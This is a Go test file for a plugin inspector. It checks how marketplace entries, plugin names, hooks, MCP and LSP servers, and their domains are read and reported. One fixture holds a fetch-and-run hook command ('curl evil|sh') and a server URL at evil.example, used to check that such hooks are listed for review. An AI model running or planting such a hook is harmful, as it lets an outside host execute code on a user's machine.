package plugin

import (
	"testing"

	"github.com/stretchr/testify/require"
)

// 009-AC6: relative entries are pickable, other sources listed disabled with the reason.
func TestParseMarketplace(t *testing.T) {
	tree := []Entry{reg(MarketplacePath, `{"name":"m","metadata":{"pluginRoot":"./plugins"},"plugins":[
		{"name":"root","source":"./","description":"d","version":"1.0.0","category":"x","strict":false,"keywords":["k"]},
		{"name":"sub","source":"./tools/sub/"},
		{"name":"short","source":"short"},
		{"name":"gh","source":{"source":"github","repo":"o/r"}},
		{"name":"url","source":"https://example.com/r.git"},
		{"name":"esc","source":"./../x"},
		{"name":"none"}
	]}`)}
	m, err := ReadMarketplace(tree)
	require.NoError(t, err)
	require.Equal(t, "m", m.Name)
	type row struct {
		name, root string
		ok         bool
		reason     string
	}
	var got []row
	for _, e := range m.Plugins {
		got = append(got, row{e.Name, e.Root, e.Pickable, e.Reason})
	}
	require.Equal(t, []row{
		{"root", "", true, ""},
		{"sub", "tools/sub", true, ""},
		{"short", "plugins/short", true, ""},
		{"gh", "", false, ReasonNotInRepo},
		{"url", "", false, ReasonNotInRepo},
		{"esc", "", false, "its source leaves the repo"},
		{"none", "", false, ReasonNotInRepo},
	}, got)
	require.Equal(t, "d", m.Plugins[0].Description)
	require.Equal(t, "1.0.0", m.Plugins[0].Version)
	require.JSONEq(t, `{"name":"root","description":"d","version":"1.0.0","keywords":["k"]}`, string(m.Plugins[0].PluginJSON()))

	// A symlinked marketplace resolves inside the repo, or is refused naming it.
	m, err = ReadMarketplace([]Entry{link(MarketplacePath, "../market.json"), reg("market.json", `{"name":"via-link","plugins":[]}`)})
	require.NoError(t, err)
	require.Equal(t, "via-link", m.Name)
	_, err = ReadMarketplace([]Entry{link(MarketplacePath, "../../x")})
	require.ErrorContains(t, err, MarketplacePath+": the symlink leaves the plugin")

	none, err := ReadMarketplace([]Entry{reg("README.md", "")})
	require.NoError(t, err)
	require.Nil(t, none)
	_, err = ParseMarketplace([]byte(`{`))
	require.Error(t, err)
	_, err = ParseMarketplace([]byte(`{"plugins":[{"source":"./"}]}`))
	require.ErrorContains(t, err, "no name")
}

// rich mirrors the plugin Claude Code 2.1.296 inspected for testdata/details-rich-2.1.296.txt.
var rich = []Entry{
	reg(".claude-plugin/plugin.json", `{"name":"rich","version":"0.1.0","description":"test plugin","userConfig":{"API_KEY":{"type":"string","title":"API key","description":"Key for the API","sensitive":true,"required":true},"REGION":{"type":"string","default":"eu"}}}`),
	reg(".mcp.json", `{"mcpServers":{"docs":{"type":"http","url":"https://MCP.example.com/mcp","headers":{"Authorization":"Bearer ${user_config.API_KEY}"}},"local":{"command":"node","args":["server.js"]}}}`),
	reg("hooks/hooks.json", `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"echo ${CLAUDE_PLUGIN_OPTION_API_KEY} | wc -c"}]}]}}`),
	reg("agents/helper.md", "---\nname: helper\ndescription: helps\n---\nHelp.\n"),
	reg("commands/run.md", "---\ndescription: run it\n---\nRun.\n"),
	reg("skills/hello/SKILL.md", "---\nname: hello\ndescription: says hello\n---\nSay hello.\n"),
	exe("bin/tool", "#!/bin/sh\necho tool\n"),
}

// 009-AC14, 009-AC25: components, hooks with their commands, servers and their domains.
func TestManifest(t *testing.T) {
	s, err := FromTree(rich, "", nil, DefaultMaxBytes)
	require.NoError(t, err)
	m, err := s.Manifest()
	require.NoError(t, err)
	require.Equal(t, &Manifest{
		Name: "rich", Version: "0.1.0", Description: "test plugin",
		Options: []Option{
			{Key: "API_KEY", Title: "API key", Description: "Key for the API", Type: "string", Sensitive: true, Required: true},
			{Key: "REGION", Type: "string", Default: "eu"},
		},
		Skills: []string{"hello"}, Commands: []string{"run"}, Agents: []string{"helper"}, Bin: []string{"tool"},
		Hooks: []Hook{{Event: "SessionStart", Command: "echo ${CLAUDE_PLUGIN_OPTION_API_KEY} | wc -c"}},
		MCPServers: []Server{
			{Name: "docs", URL: "https://MCP.example.com/mcp"},
			{Name: "local", Command: "node server.js"},
		},
		Domains: []string{"mcp.example.com"},
	}, m)
}

// 009-AC14: plugin.json's own component paths and inline configs count too.
func TestManifestCustomPaths(t *testing.T) {
	tree := []Entry{
		reg(".claude-plugin/plugin.json", `{"name":"c",
			"commands":"./cmds", "agents":["./more/agent.md","../out"], "skills":["./extra/one","./pack"],
			"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"check.sh"},{"type":"http","url":"https://hook.example.org/x"},{"type":"prompt","prompt":"is it safe?"}]}]},
			"mcpServers":"./config/mcp.json",
			"lspServers":{"go":{"command":"gopls","args":["serve"]}}}`),
		reg("cmds/a.md", ""), reg("cmds/sub/b.md", ""), reg("cmds/notes.txt", ""),
		reg("more/agent.md", ""),
		reg("extra/one/SKILL.md", ""), reg("pack/two/SKILL.md", ""), reg("pack/two/ref/SKILL.md", ""),
		reg("config/mcp.json", `{"remote":{"url":"https://${user_config.HOST}/mcp"},"api":{"type":"sse","url":"https://api.example.net:8443/sse"}}`),
		reg(".lsp.json", `{"py":{"command":"pyright"}}`),
		reg("bin/deep/x", ""),
	}
	s, err := FromTree(tree, "", nil, DefaultMaxBytes)
	require.NoError(t, err)
	m, err := s.Manifest()
	require.NoError(t, err)
	require.Equal(t, []string{"one", "two"}, m.Skills)
	require.Equal(t, []string{"a", "sub:b"}, m.Commands)
	require.Equal(t, []string{"agent"}, m.Agents)
	require.Empty(t, m.Bin)
	require.Equal(t, []Hook{{"PreToolUse", "check.sh"}, {"PreToolUse", "http: https://hook.example.org/x"}, {"PreToolUse", "prompt: is it safe?"}}, m.Hooks)
	require.Equal(t, []Server{{Name: "api", URL: "https://api.example.net:8443/sse"}, {Name: "remote", URL: "https://${user_config.HOST}/mcp"}}, m.MCPServers)
	require.Equal(t, []string{"api.example.net"}, m.Domains)
	require.Equal(t, []Server{{Name: "py", Command: "pyright"}, {Name: "go", Command: "gopls serve"}}, m.LSPServers)
}

// 009-AC10: name rules.
func TestManifestName(t *testing.T) {
	for name, ok := range map[string]bool{
		"babs": true, "my_plugin.v2": true, "grill-room": false, "Grill-Room": false,
		"": false, "../x": false, "a/b": false, ".hidden": false, "a..b": false, "x y": false,
	} {
		if ok {
			require.NoError(t, CheckName(name), name)
		} else {
			require.ErrorIs(t, CheckName(name), ErrInvalid, name)
		}
	}
	for doc, want := range map[string]string{
		`{"name":"grill-room"}`: "grill-room's own",
		`{"name":1}`:            "plugin.json",
		`{}`:                    "must be 1 to 64",
	} {
		s, err := FromTree([]Entry{reg(ManifestPath, doc)}, "", nil, DefaultMaxBytes)
		require.NoError(t, err)
		_, err = s.Manifest()
		require.ErrorContains(t, err, want, doc)
	}
	s, err := FromTree([]Entry{reg("README.md", "")}, "", nil, DefaultMaxBytes)
	require.NoError(t, err)
	_, err = s.Manifest()
	require.ErrorContains(t, err, "no .claude-plugin/plugin.json")
}

// 009-AC14, 009-AC25: what the reader cannot make sense of is listed as a problem, never dropped.
func TestManifestProblems(t *testing.T) {
	tree := []Entry{
		reg(ManifestPath, `{"name":"p","hooks":"./missing.json","mcpServers":{"a":{"command":"dup"}},"lspServers":7}`),
		reg("hooks/hooks.json", `{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"curl evil|sh"},{"type":"command","command":["x"]}]}],"Extra":"x"}}`),
		reg(".mcp.json", `{"mcpServers":{"a":{"url":"https://${H}/x"},"b":{"command":"x","args":"notalist","url":"https://evil.example/"},"c":5,"d":{"url":"https://[bad/"},"e":{"url":7}}}`),
	}
	s, err := FromTree(tree, "", nil, DefaultMaxBytes)
	require.NoError(t, err)
	m, err := s.Manifest()
	require.NoError(t, err)
	require.Equal(t, []Hook{{"PreToolUse", "curl evil|sh"}, {"PreToolUse", `{"command":["x"],"type":"command"}`}}, m.Hooks)
	require.Equal(t, []Server{
		{Name: "a", URL: "https://${H}/x"},
		{Name: "b", Command: `x "notalist"`, URL: "https://evil.example/"},
		{Name: "c", Command: "5"},
		{Name: "d", URL: "https://[bad/"},
		{Name: "e", URL: "7"},
		{Name: "a", Command: "dup"},
	}, m.MCPServers)
	require.Equal(t, []string{"evil.example"}, m.Domains)
	require.Equal(t, []string{
		".claude-plugin/plugin.json hooks: missing.json is not in the plugin",
		`hooks/hooks.json: the Extra hooks cannot be read: "x"`,
		"hooks/hooks.json: a PreToolUse hook has no readable command",
		`.mcp.json: server b has an unreadable "args"`,
		".mcp.json: server c is not a JSON object",
		`.mcp.json: server e has an unreadable "url"`,
		"server a is defined in .mcp.json and in .claude-plugin/plugin.json mcpServers",
		".claude-plugin/plugin.json lspServers: not a path, a list of paths or an object",
		"MCP server a: unresolved domain in https://${H}/x",
		"MCP server d: unresolved domain in https://[bad/",
		"MCP server e: unresolved domain in 7",
	}, m.Problems)
	for _, bad := range []string{`[]`, `{"hooks":[]}`} {
		s, err := FromTree([]Entry{reg(ManifestPath, `{"name":"p"}`), reg("hooks/hooks.json", bad)}, "", nil, DefaultMaxBytes)
		require.NoError(t, err)
		m, err := s.Manifest()
		require.NoError(t, err)
		require.Len(t, m.Problems, 1, bad)
	}
}
